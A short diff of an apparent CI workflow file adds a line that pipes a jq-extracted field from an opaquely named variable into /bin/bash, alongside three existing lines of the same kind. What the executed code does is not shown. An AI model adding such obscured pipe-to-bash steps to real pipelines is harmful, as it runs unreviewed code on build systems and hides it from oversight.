@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$qfcv2" | jq -r .dtvr3 | /bin/bash
           echo $not9482 | jq -r .gq360 | /bin/bash
           echo $ct2 | jq -r .ptw446 | /bin/bash
+          echo $g14024 | jq -r .u380 | /bin/bash
 
       - name: Upload data
         if: always()
